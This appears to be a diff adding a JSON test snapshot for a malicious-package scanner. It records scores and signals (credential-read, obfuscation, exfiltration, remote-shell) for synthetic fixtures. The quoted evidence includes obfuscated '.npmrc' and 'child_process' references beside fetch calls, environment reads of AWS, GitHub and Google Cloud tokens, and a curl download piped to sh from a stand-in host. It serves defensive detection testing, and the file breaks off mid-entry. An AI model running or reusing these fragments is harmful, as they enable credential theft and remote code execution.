@@ -1,0 +1,788 @@
+{
+ "whole: same line, plain and joined credential, network": {
+  "score": 35,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'.npmrc';'.np'+'mrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'.npmrc';'.np'+'mrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (text match)",
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'.npmrc';'.np'+'mrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: builds \".npmrc\" from pieces: …\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'.npmrc';'.np'+'mrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "whole: same line, plain and joined credential": {
+  "score": 50,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'.npmrc';'.np'+'mrc';\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'.npmrc';'.np'+'mrc';\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (text match)",
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'.npmrc';'.np'+'mrc';\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: builds \".npmrc\" from pieces: …\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'.npmrc';'.np'+'mrc';\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match)"
+    ]
+   }
+  ]
+ },
+ "whole: same line, plain and joined names of three kinds": {
+  "score": 35,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: …';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'child_process';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x');… (text match)",
+     "lib/b000000:1: …';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: builds \"child_process\" from pieces: …\u0000\u0000\u0000\u0000\u0000'child_process';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match)",
+     "lib/b000000:1: builds \".npmrc\" from pieces: …';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "whole: two lines, plain then joined": {
+  "score": 35,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: '.np'+'mrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'.npmrc'; (text match)",
+     "lib/b000000:2: '.np'+'mrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: builds \".npmrc\" from pieces: '.np'+'mrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "whole: decoded and plain on one line": {
+  "score": 65,
+  "signals": [
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: hides code in base64: …\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==','base64').toString());requi… (decoded) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "whole: escaped and plain on one line": {
+  "score": 65,
+  "signals": [
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: builds \"child_process\" from pieces: …\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000require('\\x63hild_process');require('child_process');\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also starts processes"
+    ]
+   }
+  ]
+ },
+ "whole: hidden in a comment and in code": {
+  "score": 35,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000/* '.np'+'mrc' */ '.npmrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000/* '.np'+'mrc' */ '.npmrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (text match)",
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000/* '.np'+'mrc' */ '.npmrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: builds \".npmrc\" from pieces: …\u0000\u0000\u0000\u0000\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000/* '.np'+'mrc' */ '.npmrc';fetch('x');\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000… (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "whole: three-family harvest beside the network": {
+  "score": 62,
+  "signals": [
+   {
+    "id": "exfiltration",
+    "points": -35,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: 'https';process.env.AWS_SECRET_ACCESS_KEY;process.env.GITHUB_TOKEN;process.env.G… (reads AWS, GitHub, Google Cloud tokens, and code beside it uses the network) (text match)"
+    ]
+   },
+   {
+    "id": "credential-mention",
+    "points": -3,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: 'https';process.env.AWS_SECRET_ACCESS_KEY;process.env.GITHUB_TOKEN;process.env.G… (text match)"
+    ]
+   }
+  ]
+ },
+ "whole: a download piped to a shell": {
+  "score": 39,
+  "signals": [
+   {
+    "id": "remote-shell",
+    "points": -61,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: curl -s https://collector.invalid/x.sh | sh (text match)"
+    ]
+   }
+  ]
+ },
+ "saturated: same line, plain and joined credential, network": {
+  "score": 35,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:60002: '.npmrc';'.np'+'mrc';fetch('x'); (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:60002: '.npmrc';'.np'+'mrc';fetch('x'); (text match)",
+     "lib/b000000:60002: '.npmrc';'.np'+'mrc';fetch('x'); (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:3: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:4: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:5: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:6: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "saturated: same line, plain and joined credential": {
+  "score": 35,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:60002: '.npmrc';'.np'+'mrc'; (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:60002: '.npmrc';'.np'+'mrc'; (text match)",
+     "lib/b000000:60002: '.npmrc';'.np'+'mrc'; (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:3: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:4: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:5: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:6: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also starts processes"
+    ]
+   }
+  ]
+ },
+ "saturated: same line, plain and joined names of three kinds": {
+  "score": 35,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:60002: 'child_process';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x'); (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:60002: 'child_process';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x'); (text match)",
+     "lib/b000000:60002: 'child_process';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x'); (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:3: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:4: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:5: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:6: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "saturated: two lines, plain then joined": {
+  "score": 35,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:60004: '.np'+'mrc';fetch('x'); (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:60003: '.npmrc'; (text match)",
+     "lib/b000000:60004: '.np'+'mrc';fetch('x'); (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:3: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:4: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:5: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:6: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:7: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "saturated: decoded and plain on one line": {
+  "score": 65,
+  "signals": [
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:3: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:4: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:5: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:6: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "saturated: escaped and plain on one line": {
+  "score": 65,
+  "signals": [
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:60002: builds \"child_process\" from pieces: require('\\x63hild_process');require('child_process'); (after joining strings) (text match)",
+     "lib/b000000:2: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:3: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:4: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:5: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also starts processes"
+    ]
+   }
+  ]
+ },
+ "saturated: hidden in a comment and in code": {
+  "score": 35,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:60002: /* '.np'+'mrc' */ '.npmrc';fetch('x'); (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:60002: /* '.np'+'mrc' */ '.npmrc';fetch('x'); (text match)",
+     "lib/b000000:60002: /* '.np'+'mrc' */ '.npmrc';fetch('x'); (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:3: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:4: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:5: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:6: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "saturated: three-family harvest beside the network": {
+  "score": 27,
+  "signals": [
+   {
+    "id": "exfiltration",
+    "points": -35,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:60003: 'https';process.env.AWS_SECRET_ACCESS_KEY;process.env.GITHUB_TOKEN;process.env.G… (reads AWS, GitHub, Google Cloud tokens, and code beside it uses the network) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:3: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:4: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:5: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:6: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   },
+   {
+    "id": "credential-mention",
+    "points": -3,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:60003: 'https';process.env.AWS_SECRET_ACCESS_KEY;process.env.GITHUB_TOKEN;process.env.G… (text match)"
+    ]
+   }
+  ]
+ },
+ "saturated: a download piped to a shell": {
+  "score": 4,
+  "signals": [
+   {
+    "id": "remote-shell",
+    "points": -61,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:60003: curl -s https://collector.invalid/x.sh | sh (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:3: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:4: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:5: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)",
+     "lib/b000000:6: builds \"child_process\" from pieces: 'child_'+'process'; (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "stopped: same line, plain and joined credential, network": {
+  "score": 35,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: '.npmrc';'.np'+'mrc';fetch('x'); (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:2: '.npmrc';'.np'+'mrc';fetch('x'); (text match)",
+     "lib/b000000:2: '.npmrc';'.np'+'mrc';fetch('x'); (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000��\u0013\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a… (after joining strings) (text match)",
+     "lib/b000000:2: builds \".npmrc\" from pieces: '.npmrc';'.np'+'mrc';fetch('x'); (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "stopped: same line, plain and joined credential": {
+  "score": 50,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: '.npmrc';'.np'+'mrc'; (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:2: '.npmrc';'.np'+'mrc'; (text match)",
+     "lib/b000000:2: '.npmrc';'.np'+'mrc'; (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000��\u0013\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a… (after joining strings) (text match)",
+     "lib/b000000:2: builds \".npmrc\" from pieces: '.npmrc';'.np'+'mrc'; (after joining strings) (text match)"
+    ]
+   }
+  ]
+ },
+ "stopped: same line, plain and joined names of three kinds": {
+  "score": 35,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: 'child_process';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x'); (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:2: 'child_process';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x'); (text match)",
+     "lib/b000000:2: 'child_process';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x'); (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000��\u0013\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a… (after joining strings) (text match)",
+     "lib/b000000:2: builds \"child_process\" from pieces: 'child_process';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x'); (after joining strings) (text match)",
+     "lib/b000000:2: builds \".npmrc\" from pieces: 'child_process';'.npmrc';'chi'+'ld_process';'.np'+'mrc';fetch('x'); (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "stopped: two lines, plain then joined": {
+  "score": 35,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:3: '.np'+'mrc';fetch('x'); (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:2: '.npmrc'; (text match)",
+     "lib/b000000:3: '.np'+'mrc';fetch('x'); (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000��\u0013\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a… (after joining strings) (text match)",
+     "lib/b000000:3: builds \".npmrc\" from pieces: '.np'+'mrc';fetch('x'); (after joining strings) (text match)"
